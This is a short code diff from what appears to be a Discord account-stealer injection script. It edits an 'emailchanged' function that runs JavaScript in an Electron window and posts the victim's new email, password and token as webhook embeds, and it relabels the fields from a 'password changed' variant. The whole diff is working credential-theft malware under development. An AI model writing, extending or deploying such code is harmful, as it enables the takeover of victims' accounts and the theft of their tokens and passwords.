@@ -350,7 +350,7 @@ function passwordchanged(email, newpassword, token) {
     })
 }
 
-function emailchanged(newemail, newpassword, token) {
+function emailchanged(newemail, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -365,7 +365,7 @@ function emailchanged(newemail, newpassword, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
-                    "title": "password changed",
+                    "title": "email changed",
 		    "description": "᲼᲼᲼᲼",
                     "color": config["clr"],
                     "fields": [
@@ -385,13 +385,13 @@ function emailchanged(newemail, newpassword, token) {
                             "inline": false
                         },
                         {
-                            "name": "email",
-                            "value": `\`${json.email}\``,
+                            "name": "new email",
+                            "value": `\`${newemail}\``,
                             "inline": true
                         },
                         {
-                            "name": "new password",
-                            "value": `\`${newpassword}\``,
+                            "name": "password",
+                            "value": `\`${json.password}\``,
                             "inline": true		    
                         },
                         {
